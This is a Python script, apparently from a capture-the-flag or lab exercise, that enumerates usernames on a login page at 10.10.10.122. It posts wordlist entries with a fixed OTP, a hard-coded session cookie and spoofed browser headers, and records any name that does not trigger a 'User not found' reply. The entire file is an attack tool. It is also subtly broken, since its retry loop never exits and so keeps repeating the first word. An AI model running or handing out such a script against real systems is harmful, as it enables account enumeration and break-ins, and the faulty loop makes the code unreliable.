#!/usr/bin/python3
import requests
import sys
import hmac
import binascii
import time

UA_STRING = 'Mozilla/5.0 (X11; Linux x86_64; rv:64.0) Gecko/20100101 Firefox/64.0'
COOKIE = 'PHPSESSID=bnhq9spoaiq57898lt97q658i6'
BASE_URL = 'http://10.10.10.122/login.php'
REFERER = 'http://10.10.10.122/login.php'
WORDLIST = sys.argv[1]

with open(WORDLIST) as f:
	wordlist = f.read().split('\n')

log = open('brute.log', 'a')

s = requests.Session()

def fingerprint(resp):
	chain = b''
	chain = hmac.new(chain, resp.content).digest()
	return binascii.b2a_hex(chain).decode()

for word in wordlist:
	headers = {
		'User-Agent': UA_STRING,
		'Cookie': COOKIE,
		'Referer': REFERER,
	}
	form = {
		'inputUsername': word,
		'inputOTP': '1234',
	}
	print('trying', word)
	while True:
		try:
			resp = s.post(BASE_URL, headers=headers, data=form, allow_redirects=False)
			#print(fingerprint(resp), word)
			if f'User {word} not found' not in resp.text:
				print('FOUND', word)
				log.write('FOUND ' + word + '\n')
			time.sleep(5)
		except:
			print('failed', word)
			time.sleep(60)
